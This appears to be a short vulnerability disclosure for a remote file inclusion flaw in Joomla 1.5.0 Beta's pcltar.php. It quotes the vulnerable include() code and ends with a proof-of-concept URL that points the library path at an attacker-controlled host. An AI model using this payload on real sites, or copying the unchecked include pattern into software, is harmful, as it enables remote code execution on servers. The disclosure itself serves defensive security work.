<html><head><title>Joomla 1.5.0 Beta (pcltar.php) Remote File Inclusion Vulnerability</title></head><pre>Hi,
Joomla! 1.5.0 is in Beta version and &quot;should NOT to be used for `live`
or `production` sites.&quot;
Joomla 1.0.12 has a good security but it seems that Joomla 1.5.0 doesnt
have a good security approach. Anyway, there is a remote file inclusion
in Joomla 1.5.0 Beta :

File /libraries/pcl/pcltar.php, Line 74 :
 if (!defined(&quot;PCLERROR_LIB&quot;))
 {
       include($g_pcltar_lib_dir.&quot;/pclerror.lib.&quot;.$g_pcltar_extension);
 }

POC : http://hacked/libraries/pcl/pcltar.php?g_pcltar_lib_dir=http://hacker/?
